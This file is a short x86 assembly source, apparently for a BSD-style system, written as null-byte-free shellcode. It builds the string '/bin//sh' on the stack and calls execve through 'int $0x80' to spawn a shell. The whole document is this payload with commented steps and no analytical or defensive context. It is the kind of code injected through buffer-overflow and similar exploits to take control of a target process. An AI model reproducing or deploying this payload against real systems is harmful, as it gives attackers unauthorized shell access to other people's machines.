	.text
.globl _start
_start:
	xorl	%eax, %eax
	pushl	%eax		# make string end with null
	pushl	$0x68732f2f	# //sh
	pushl	$0x6e69622f	# /bin
	movl	%esp, %ecx	# address to string in %ecx

	pushl	%eax
	pushl	%ecx		# now argc has been built
	movl	%esp, %edx	# and stored in %edx

	pushl	%eax		# 3rd arg: NULL
	pushl	%edx		# 2nd arg: {"/bin/sh", NULL}
	pushl	%ecx		# 1st arg: "/bin/sh"
	movb	$59, %al	# 59 = AUE_EXECVE
	pushl	%eax
	int	$0x80		# execve("/bin/sh", {"/bin/sh", NULL}, NULL)
